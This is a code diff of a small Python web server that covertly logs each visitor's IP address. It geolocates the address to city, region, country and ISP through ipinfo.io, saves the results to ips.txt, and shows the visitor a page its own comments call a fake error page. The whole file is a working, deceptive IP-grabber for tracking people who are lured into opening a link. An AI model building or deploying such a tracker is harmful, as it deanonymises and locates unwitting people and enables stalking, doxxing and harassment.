@@ -1,26 +1,29 @@
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import logging
-import json
-import urllib.request
+import requests
 
 class IPLoggerHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         client_ip = self.client_address[0]
 
-        # Get geolocation data
+        # Fetch geolocation info
         try:
-            with urllib.request.urlopen(f"http://ip-api.com/json/{client_ip}") as url:
-                geo_data = json.loads(url.read().decode())
-                location_info = f"{geo_data.get('city', 'Unknown')}, {geo_data.get('country', 'Unknown')} | ISP: {geo_data.get('isp', 'Unknown')}"
-        except:
-            location_info = "Location lookup failed"
+            response = requests.get(f"https://ipinfo.io/{client_ip}/json")
+            data = response.json()
+            city = data.get("city", "Unknown")
+            region = data.get("region", "Unknown")
+            country = data.get("country", "Unknown")
+            org = data.get("org", "Unknown ISP")
+        except Exception as e:
+            city = region = country = org = "Unavailable"
 
-        # Log to file
-        logging.info(f"Visitor IP: {client_ip} | {location_info}")
+        # Log details
+        log_entry = f"IP: {client_ip} | {city}, {region}, {country} | ISP: {org}"
+        logging.info(log_entry)
         with open("ips.txt", "a") as f:
-            f.write(f"{client_ip} - {location_info}\n")
+            f.write(log_entry + "\n")
 
-        # Fake "blog error" page
+        # Fake error page
         self.send_response(200)
         self.send_header('Content-type', 'text/html')
         self.end_headers()
